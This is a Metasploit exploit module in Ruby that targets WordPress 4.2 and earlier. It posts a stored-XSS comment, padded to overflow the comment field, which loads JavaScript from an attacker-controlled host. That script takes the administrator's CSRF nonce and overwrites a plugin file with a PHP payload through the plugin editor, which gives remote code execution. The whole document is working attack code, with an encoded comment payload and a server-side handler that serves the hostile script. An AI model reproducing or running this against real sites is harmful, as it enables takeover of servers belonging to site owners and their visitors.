##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::HTML
    include Rex::Text

    def initialize(info={})
        super(update_info(info,
            'Name'           => "WordPress Administrator Remote Code Execution Through XSS",
            'Description'    => %q{
                    This module exploits a XSS vulnerability found in WordPress 4.2, 4.1.2, 4.1.1, and 3.9.3. This vulnerabilities allows an unauthenticated attacker to inject arbitrary JavaScript code into comment fields. The module utilizes administrator authenticated XSS escalation through the WordPress plugin editor to gain remote code execution.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Jouko Pynnonen', 	  #Initial Proof of Concept
                    'Matthew Toussain'	  #Everything else
                ],
            'References'     =>
                [
                    ['URL', 'http://kinozoa.com/blog/wordpress-4-2-comment-field-overflow/'],
                    ['URL', 'http://klikki.fi/adv/wordpress2.html']
                ],
            'Arch'           => ARCH_PHP,
            'Payload'          =>
                {
                    'DisableNops' => true,
                    'Compat'              =>
                        {
                            'ConnectionType' => 'find',
                        },
                        # Arbitrary big number. The payload gets sent as an HTTP
                        # response body, so really it's unlimited
                        'Space'       => 262144, # 256k
                },
            'Platform'       => 'php',
            'Targets'        =>
                [
                    ['Wordpress <= 4.2, 4.1.2, 4.1.1, 3.9.3', {}]
                ],
            'Privileged'     => false,
            'DisclosureDate'  => "Apr 26 2015",
            'DefaultTarget'  => 0))

        register_options(
            [
                OptString.new('PLUGIN',  [true, 'This is the WordPress plugin file that will be written to.','akismet/akismet.php']),
                OptString.new('COMMENTID',  [true, 'This is id of the WordPress page that will be commented on.','1']),
                OptString.new('RHOST',  [true, 'This is the WordPress install directory']),
                OptString.new('LHOST',  [true, 'This is the IP to connect back to for the javascript','0.0.0.0']),
                OptString.new('URIPATH', [true, 'This is the URI path that will be created for the javascript hosted file','wp-met.js']),
                OptString.new('SRVPORT', [true, 'This is the port for the javascript to connect back to','80']),
            ], self.class)
        end


        def exploit

            padding = "A"*66000

            comment = "%3Ca+title%3D%27xxx+onmouseover%3Deval%28unescape%28%2Fvar%2520a%253Ddocument.createElement%2528%2527script%2527%2529%253Ba.setAttribute%2528%2527src%2527%252C%2527http%253A%252f%252f#{datastore['LHOST']}%253A#{datastore['SRVPORT']}%252f#{datastore['URIPATH']}%2527%2529%253Bdocument.head.appendChild%2528a%2529%2F.source%29%29+style%3Dposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3Bwidth%3A5000px%3Bheight%3A5000px++" + padding + "%27%3E%3C%2Fa%3E"

            comment_post_ID = "#{datastore['COMMENTID']}"
            cookie = "wp-settings-time-1=1431669695;"
            post_data = "author=a&email=a%40a.com&url=http%3A%2F%2Fa&comment=" + comment + "&submit=Post+Comment&comment_post_ID=" + comment_post_ID + "&comment_parent=0"


            resp = send_request_cgi({
            'uri'     => "http://#{rhost}/wp-comments-post.php",
            'version' => '1.1',
            'method'  => 'POST',
            'data'    => post_data,
            'cookie'  => cookie
          })



          super

          end

          def on_request_uri(cli, request)

                return if ((p = regenerate_payload(cli)) == nil)

                rhost = datastore['RHOST']
                plugin = datastore['PLUGIN']
                page = "wp-comments-post-php"

                p2 = payload.encoded
                require 'cgi'
                pc = CGI.escape(p2)

                content = %Q|
            var pcont = "#{pc}";
            var head = "<?php ";
            var tail = " ?> ";
            var payload = head + pcont + tail;

            function get(url)
            {
                var http = null;
                http = new XMLHttpRequest();
                http.open( "GET", url, false );
                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.send( null );
                return http.responseText;
            }
            function post(url, csrftoken)
            {
                var http = null;
                http = new XMLHttpRequest();
                http.open( "POST", url, false );
                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.send("_wpnonce=" + csrftoken + "&_wp_http_referer=#{rhost}%2Fwp-admin%2Fplugin-editor.php%3Ffile%3D#{plugin}%26a%3Dte%26scrollto%3D605&newcontent=" + payload + "&action=update&file=#{plugin}&plugin=#{plugin}&scrollto=0&submit=Update+File");
                return http.responseText;
            }

            var page = get("http://#{rhost}/wp-admin/plugin-editor.php?file=#{plugin}&plugin=#{plugin}");

            var regExp = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
            var matches = regExp.exec(page);
            var csrftoken = matches[1].slice(0, 10);

            post("http://#{rhost}/wp-admin/plugin-editor.php", csrftoken);
            get("http://#{rhost}/wp-content/plugins/#{plugin}");
                        |

                print_status("Sending #{self.name}")

                send_response_html(cli, content)

          end

end
